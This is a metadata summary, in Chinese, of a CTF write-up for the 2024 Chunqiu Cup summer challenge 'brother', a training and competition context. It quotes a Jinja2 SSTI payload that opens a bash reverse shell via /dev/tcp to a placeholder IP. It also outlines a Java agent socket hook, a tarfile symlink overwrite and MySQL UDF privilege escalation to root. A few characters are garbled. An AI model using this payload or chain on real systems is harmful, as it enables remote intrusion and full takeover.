...
tags:
- SSTI-rebound-shell
- sql-proxy.jar-tcp-forward
- Java-agent-attach
- send-method-hook
- evil.key-read
- MySQL-UDF-privesc
- tarfile-symlink-overwrite
...
quality: high
full_path: 【WP】2024年春秋杯夏季赛“brother”出题思路详解.full.md
meta_path: 【WP】2024年春秋杯夏季赛“brother”出题思路详解.meta.md
images_removed: true
images_removed_count: 5
schema_version: v3.0.0-P0
summary: 【WP】2024年春秋杯夏季赛 brother 出题思路详解。2024 春秋杯夏季赛 brother 出题思路，SSTI 反弹 shell + sql-proxy.jar Java agent hook send + MySQL UDF 提权。。经验：sql-proxy.jar 用 Base64ClassLoader 动态加载类，Java agent 可劫持 socke...
category: web
...
contest_type: open
wp_url: https://www.ctfiot.com/195033.html
wp_author: IntelliJ
reasoning_chain:
- 入口 SSTI Jinja2 {{lipsum.__globals__['os'].popen('bash -i >& /dev/tcp/IP/6666').read()}} → 反弄 shell
- 拿到 one 用户 shell → flag 是 root 只读 → 假设：提权 three 用户
- sql-proxy.jar 监听 6666 转 3306 → two 用户跑 api.py 周期性 MySQL 存活检测
- Java agent 动态加载 Base64ClassLoader → 动作：动态加载自定义 Class
- Java agent 加个函数→ 写 socket send 接收反应 → api.py code=1 时 update.py 接 tar.gz 解压 new.bin → 观察：tarfile 软链接覆盖
- UDF so 写入 → CREATE FUNCTION sys_exec → 提权 root → flag
failed_attempts:
- 试图 SQL 注入 → 仅 3306 端口代理
- 试图直接 su three → one 无密码
- 试图 wget 上传 so → write 权限不在 three
key_observations:
- sql-proxy.jar Base64ClassLoader 动态加载类是 Java agent 注入关键
- Java agent 加个函数诡抣 socket send 是改 MySQL 协议响应核心
- tarfile 软链接覆盖写入漏洞（CVE-2007-4559 同源）
- MySQL UDF 提权需要 plugin_dir 写入权限
- SSTI 反弄 shell 是 web 入口常用 RCE 模式
prerequisites:
- Jinja2 SSTI 利用链 (lipsum.__globals__['os'])
- Java agent + Instrumentation API
- tarfile 软链接覆盖漏洞（CVE-2007-4559）
- MySQL UDF 提权流程
---
